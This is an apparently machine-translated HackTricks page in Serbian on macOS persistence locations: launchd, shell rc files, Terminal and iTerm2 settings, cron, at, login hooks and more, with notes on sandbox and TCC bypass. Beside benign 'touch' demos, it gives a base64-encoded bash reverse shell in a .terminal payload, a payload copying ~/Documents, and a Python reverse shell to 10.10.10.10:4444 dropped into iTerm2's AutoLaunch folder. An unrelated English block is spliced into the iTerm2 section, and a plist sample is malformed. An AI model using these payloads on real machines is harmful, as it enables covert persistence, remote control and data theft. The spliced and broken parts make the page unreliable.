# macOS Auto Start

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ova sekcija se temelji na blog seriji [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), cilj je dodati **više lokacija za automatsko pokretanje** (ako je moguće), naznačiti **koje tehnike još uvek funkcionišu** danas sa najnovijom verzijom macOS-a (13.4) i specificirati **potrebne dozvole**.

## Bypassovanje peska

{% hint style="success" %}
Ovde možete pronaći lokacije za pokretanje korisne za **bypassovanje peska** koje vam omogućavaju da jednostavno izvršite nešto tako što to **upišete u fajl** i **sačekate** za vrlo **uobičajenu** **akciju**, određeno **vreme** ili **akciju koju obično možete izvršiti** iz peska bez potrebe za root dozvolama.
{% endhint %}

### Launchd

* Korisno za bypassovanje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`/Library/LaunchAgents`**
* **Okidač**: Restart
* Potrebno root pristup
* **`/Library/LaunchDaemons`**
* **Okidač**: Restart
* Potrebno root pristup
* **`/System/Library/LaunchAgents`**
* **Okidač**: Restart
* Potrebno root pristup
* **`/System/Library/LaunchDaemons`**
* **Okidač**: Restart
* Potrebno root pristup
* **`~/Library/LaunchAgents`**
* **Okidač**: Ponovno prijavljivanje
* **`~/Library/LaunchDemons`**
* **Okidač**: Ponovno prijavljivanje

#### Opis & Eksploatacija

**`launchd`** je **prvi** **proces** koji se izvršava od strane OX S kernela pri pokretanju i poslednji koji se završava pri gašenju. Uvek bi trebao imati **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije naznačene u **ASEP** **plistama** u:

* `/Library/LaunchAgents`: Agensi instalirani po korisniku od strane administratora
* `/Library/LaunchDaemons`: Demoni na nivou sistema instalirani od strane administratora
* `/System/Library/LaunchAgents`: Agensi po korisniku koje pruža Apple.
* `/System/Library/LaunchDaemons`: Demoni na nivou sistema koje pruža Apple.

Kada se korisnik prijavi, plistovi smešteni u `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` se pokreću sa **dozvolama prijavljenih korisnika**.

**Glavna razlika između agenata i demona je u tome što se agenti učitavaju kada se korisnik prijavi, a demoni se učitavaju pri pokretanju sistema** (kako postoje servisi poput ssh koji moraju biti izvršeni pre nego što bilo koji korisnik pristupi sistemu). Takođe, agenti mogu koristiti GUI dok demoni moraju raditi u pozadini.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```

Postoje slučajevi kada je **potrebno izvršiti agenta pre nego što se korisnik prijavi**, ovi se nazivaju **PreLoginAgents**. Na primer, ovo je korisno za pružanje asistivne tehnologije pri prijavi. Mogu se pronaći i u `/Library/LaunchAgents` (videti [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

{% hint style="info" %}
Konfiguracioni fajlovi novih demona ili agenata će biti **učitani nakon sledećeg restarta ili korišćenjem** `launchctl load <target.plist>` Takođe je **moguće učitati .plist fajlove bez te ekstenzije** sa `launchctl -F <file>` (međutim, ti plist fajlovi neće biti automatski učitani nakon restarta).\
Takođe je moguće **isključiti** ih sa `launchctl unload <target.plist>` (proces na koji pokazuje će biti završen).

Da **osigurate** da ne postoji **ništa** (kao što je prekoračenje) **koje sprečava** **Agenta** ili **Demona** **da se pokrene**, pokrenite: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`
{% endhint %}

Izlistajte sve agente i demone učitane od strane trenutnog korisnika:

```bash
launchctl list
```

{% hint style="warning" %}
Ako je plist u vlasništvu korisnika, čak i ako se nalazi u sistemskim folderima demona, **zadatak će se izvršiti kao korisnik** a ne kao root. Ovo može sprečiti neke napade na eskalaciju privilegija.
{% endhint %}

### fajlovi za pokretanje ljuske

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
* Ali morate pronaći aplikaciju sa TCC zaobilaženjem koja izvršava ljusku koja učitava ove fajlove

#### Lokacije

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Okidač**: Otvorite terminal sa zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Okidač**: Otvorite terminal sa zsh
* Potreban je root
* **`~/.zlogout`**
* **Okidač**: Izlaz iz terminala sa zsh
* **`/etc/zlogout`**
* **Okidač**: Izlaz iz terminala sa zsh
* Potreban je root
* Potencijalno više u: **`man zsh`**
* **`~/.bashrc`**
* **Okidač**: Otvorite terminal sa bash
* `/etc/profile` (nije radilo)
* `~/.profile` (nije radilo)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Okidač**: Očekuje se da će se pokrenuti sa xterm, ali **nije instaliran** i čak nakon instalacije javlja se greška: xterm: `DISPLAY is not set`

#### Opis & Eksploatacija

Prilikom pokretanja okruženja ljuske kao što su `zsh` ili `bash`, **određeni fajlovi za pokretanje se izvršavaju**. macOS trenutno koristi `/bin/zsh` kao podrazumevanu ljusku. Ova ljuska se automatski pristupa kada se pokrene aplikacija Terminal ili kada se uređaj pristupa putem SSH. Iako su `bash` i `sh` takođe prisutni u macOS-u, moraju se eksplicitno pozvati da bi se koristili.

Man stranica za zsh, koju možemo pročitati sa **`man zsh`**, ima dugačak opis fajlova za pokretanje.

```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```

### Ponovno otvorene aplikacije

{% hint style="danger" %}
Konfigurisanje naznačenog iskorišćavanja i odjavljivanje i ponovno prijavljivanje ili čak ponovno pokretanje nisu radili za mene da bih izvršio aplikaciju. (Aplikacija nije bila izvršena, možda treba da se pokreće kada se ove radnje izvrše)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Okidač**: Ponovno pokretanje aplikacija

#### Opis i Iskorišćavanje

Sve aplikacije za ponovno otvaranje nalaze se unutar plist datoteke `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Dakle, da biste omogućili da se vaša aplikacija pokrene prilikom ponovnog otvaranja aplikacija, samo treba da **dodate svoju aplikaciju na listu**.

UUID se može pronaći listanjem tog direktorijuma ili sa `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili aplikacije koje će biti ponovo otvorene, možete uraditi:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Da **dodate aplikaciju na ovaj spisak** možete koristiti:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Postavke Terminala

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Terminal koristi FDA dozvole korisnika koji ga koristi

#### Lokacija

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Okidač**: Otvori Terminal

#### Opis & Eksploatacija

U **`~/Library/Preferences`** se čuvaju postavke korisnika u Aplikacijama. Neke od ovih postavki mogu sadržati konfiguraciju za **izvršavanje drugih aplikacija/skripti**.

Na primer, Terminal može izvršiti komandu pri pokretanju:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se odražava u datoteci **`~/Library/Preferences/com.apple.Terminal.plist`** ovako:

```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```

Dakle, ako se plist datoteka postavki terminala u sistemu može prepisati, onda se **`open`** funkcionalnost može koristiti da **otvori terminal i izvrši tu komandu**.

To možete dodati sa komandne linije pomoću:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Terminalski skriptovi / Druge ekstenzije fajlova

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Terminal koristi FDA dozvole korisnika koji ga koristi

#### Lokacija

* **Bilo gde**
* **Okidač**: Otvori Terminal

#### Opis & Eksploatacija

Ako kreirate [**`.terminal`** skript](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i otvorite ga, **Terminal aplikacija** će automatski biti pozvana da izvrši komande navedene unutra. Ako Terminal aplikacija ima neke posebne privilegije (kao što su TCC), vaša komanda će biti izvršena sa tim posebnim privilegijama.

Probajte sa:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni pristup TCC-u

#### Lokacija

* **`/Library/Audio/Plug-Ins/HAL`**
* Potreban je root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`/Library/Audio/Plug-ins/Components`**
* Potreban je root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`~/Library/Audio/Plug-ins/Components`**
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara
* **`/System/Library/Components`**
* Potreban je root
* **Okidač**: Ponovno pokretanje coreaudiod-a ili računara

#### Opis

Prema prethodnim objavama moguće je **kompajlirati neke audio dodatke** i učitati ih.

### QuickLook dodaci

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🟠](https://emojipedia.org/large-orange-circle)
* Možda ćete dobiti dodatni pristup TCC-u

#### Lokacija

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis & Eksploatacija

QuickLook dodaci mogu se izvršiti kada **pokrenete pregled datoteke** (pritisnite taster razmaka dok je datoteka označena u Finderu) i instaliran je **dodatak koji podržava taj tip datoteke**.

Moguće je kompajlirati svoj QuickLook dodatak, smestiti ga na jedno od prethodnih mesta kako bi se učitao, a zatim otići do podržane datoteke i pritisnuti razmak kako biste ga pokrenuli.

### ~~Login/Logout Hooks~~

{% hint style="danger" %}
Ovo nije radilo za mene, ni sa korisničkim LoginHook-om ni sa root LogoutHook-om
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Morate moći da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* `Lo`ciran u `~/Library/Preferences/com.apple.loginwindow.plist`

Oni su zastareli, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Ova postavka je sačuvana u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` datoteci.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```

Da biste ga obrisali:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Root korisnik se čuva u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Uslovno zaobilaženje peska

{% hint style="success" %}
Ovde možete pronaći lokacije pokretanja korisne za **zaobilaženje peska** koje vam omogućavaju da jednostavno izvršite nešto tako što to **upišete u datoteku** i očekujete ne baš česte uslove poput specifičnih **instaliranih programa, "neobičnih" korisničkih** radnji ili okruženja.
{% endhint %}

### Cron

**Objašnjenje**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Međutim, morate moći da izvršite `crontab` binarnu datoteku
* Ili biti root
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Potreban je root za direktni pristup pisanju. Root nije potreban ako možete izvršiti `crontab <datoteka>`
* **Okidač**: Zavisi od cron posla

#### Opis & Eksploatacija

Izlistajte cron poslove **trenutnog korisnika** sa:

```bash
crontab -l
```

Možete videti sve cron poslove korisnika u **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (potreban je root).

Na macOS-u se mogu pronaći nekoliko foldera koji izvršavaju skripte s **određenom učestalošću**:

```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```

Ovde možete pronaći redovne **cron** **poslove**, **at** **poslove** (koji se retko koriste) i **periodične** **poslove** (uglavnom korišćene za čišćenje privremenih fajlova). Dnevni periodični poslovi mogu biti izvršeni na primer sa: `periodic daily`.

Za dodavanje **korisničkog cron posla programatski** moguće je koristiti:

```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```

### iTerm2

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 je nekada imao odobrene TCC dozvole

#### Lokacije

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Okidač**: Otvori iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Okidač**: Otvori iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Okidač**: Otvori iTerm

#### Opis & Eksploatacija

Skripte smeštene u **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** će biti izvršene. Na primer:

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```

## macOS Auto Start Locations

### Launch Agents

Launch Agents are used to run processes when a user logs in. They are stored in `~/Library/LaunchAgents/` or `/Library/LaunchAgents/`.

### Launch Daemons

Launch Daemons are used to run processes at system boot or login. They are stored in `/Library/LaunchDaemons/`.

### Login Items

Login Items are applications that open when a user logs in. They are managed in `System Preferences > Users & Groups > Login Items`.

### Startup Items

Startup Items are legacy items that automatically launch when a system boots up. They are stored in `/Library/StartupItems/`.

```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```

Skripta **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** će takođe biti izvršena:

```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Postavke iTerm2 nalaze se u **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu **ukazati na komandu koja će se izvršiti** kada se otvori iTerm2 terminal.

Ovu postavku možete konfigurisati u postavkama iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

A komanda se odražava u postavkama:

```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```

Možete postaviti komandu za izvršenje sa:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
Visoko je verovatno da postoje **druge metode zloupotrebe iTerm2 postavki** za izvršavanje proizvoljnih komandi.
{% endhint %}

### xbar

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali xbar mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Traži dozvole za pristupačnost

#### Lokacija

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Okidač**: Jednom kada se xbar izvrši

#### Opis

Ako je instaliran popularni program [**xbar**](https://github.com/matryer/xbar), moguće je napisati shell skriptu u **`~/Library/Application\ Support/xbar/plugins/`** koja će se izvršiti kada se xbar pokrene:

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Opis**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali Hammerspoon mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Traži dozvole za pristupačnost

#### Lokacija

* **`~/.hammerspoon/init.lua`**
* **Okidač**: Jednom kada se Hammerspoon pokrene

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA skriptni jezik** za svoje operacije. Posebno podržava integraciju potpunog AppleScript koda i izvršavanje shell skripti, značajno unapređujući svoje sposobnosti skriptiranja.

Aplikacija traži jedan fajl, `~/.hammerspoon/init.lua`, i kada se pokrene, skripta će biti izvršena.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

* Korisno za zaobilaženje peska-boksa: [✅](https://emojipedia.org/check-mark-button)
* Ali BetterTouchTool mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za automatizaciju prečica i pristupačnost

#### Lokacija

* `~/Library/Application Support/BetterTouchTool/*`

Ovaj alat omogućava označavanje aplikacija ili skripti za izvršavanje kada se pritisnu određene prečice. Napadač bi mogao da konfiguriše svoju **prečicu i akciju za izvršavanje u bazi podataka** kako bi izvršio proizvoljan kod (prečica bi mogla biti samo pritisak tastera).

### Alfred

* Korisno za zaobilaženje peska-boksa: [✅](https://emojipedia.org/check-mark-button)
* Ali Alfred mora biti instaliran
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* Zahteva dozvole za automatizaciju, pristupačnost i čak pristup celom disku

#### Lokacija

* `???`

Omogućava kreiranje radnih tokova koji mogu izvršiti kod kada se ispune određeni uslovi. Potencijalno je moguće da napadač kreira datoteku radnog toka i natera Alfred da je učita (potrebno je platiti premium verziju za korišćenje radnih tokova).

### SSHRC

Opis: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Korisno za zaobilaženje peska-boksa: [✅](https://emojipedia.org/check-mark-button)
* Ali ssh mora biti omogućen i korišćen
* TCC zaobilaženje: [✅](https://emojipedia.org/check-mark-button)
* SSH ima pristup celom disku

#### Lokacija

* **`~/.ssh/rc`**
* **Okidač**: Prijavljivanje putem ssh
* **`/etc/ssh/sshrc`**
* Potreban je root
* **Okidač**: Prijavljivanje putem ssh

{% hint style="danger" %}
Za uključivanje ssh-a potreban je pristup celom disku:

```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Opis & Eksploatacija

Podrazumevano, osim ako nije `PermitUserRC no` u `/etc/ssh/sshd_config`, kada se korisnik **prijavi putem SSH-a**, skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`** će biti izvršene.

### **Stavke za prijavljivanje**

Writeup: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate izvršiti `osascript` sa argumentima
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Okidač:** Prijavljivanje
* Eksploatacija payloada pozivanjem **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Okidač:** Prijavljivanje
* Potreban je root

#### Opis

U Sistemskim postavkama -> Korisnici & Grupa -> **Stavke za prijavljivanje** možete pronaći **stavke koje će se izvršiti kada se korisnik prijavi**.\
Moguće ih je izlistati, dodati i ukloniti sa komandne linije:

```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```

Ovi predmeti se čuvaju u datoteci **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Stavke za prijavljivanje** takođe mogu biti naznačene korišćenjem API-ja [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) koji će sačuvati konfiguraciju u **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP kao stavka za prijavljivanje

(Proverite prethodni odeljak o stavkama za prijavljivanje, ovo je proširenje)

Ako sačuvate **ZIP** datoteku kao **stavku za prijavljivanje**, **`Archive Utility`** će je otvoriti, a ako je zip na primer sačuvan u **`~/Library`** i sadrži fasciklu **`LaunchAgents/file.plist`** sa zadnjim ulazom, ta fascikla će biti kreirana (to nije podrazumevano) i plist će biti dodat tako da sledeći put kada se korisnik ponovo prijavi, **zadnji ulaz naznačen u plist-u će biti izvršen**.

Druga opcija bila bi kreiranje datoteka **`.bash_profile`** i **`.zshenv`** unutar korisničkog HOME-a tako da ako fascikla LaunchAgents već postoji, ova tehnika bi i dalje radila.

### At

Objašnjenje: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Korisno za zaobilaženje peska: [✅](https://emojipedia.org/check-mark-button)
* Ali morate **izvršiti** **`at`** i on mora biti **omogućen**
* TCC zaobilaženje: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

* Morate **izvršiti** **`at`** i on mora biti **omogućen**

#### **Opis**

`at` zadaci su dizajnirani za **planiranje jednokratnih zadataka** koji će biti izvršeni u određeno vreme. Za razliku od cron poslova, `at` zadaci se automatski uklanjaju nakon izvršenja. Bitno je napomenuti da su ovi zadaci postojani nakon ponovnog pokretanja sistema, što ih čini potencijalnim sigurnosnim rizikom u određenim uslovima.

Podrazumevano su **onemogućeni**, ali **root** korisnik može **omogućiti** **njih** sa:

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Ovo će kreirati fajl za 1 sat:

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Proverite red poslova koristeći `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Iznad možemo videti dva zakazana posla. Detalje posla možemo odštampati koristeći `at -c BROJPOSLA`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

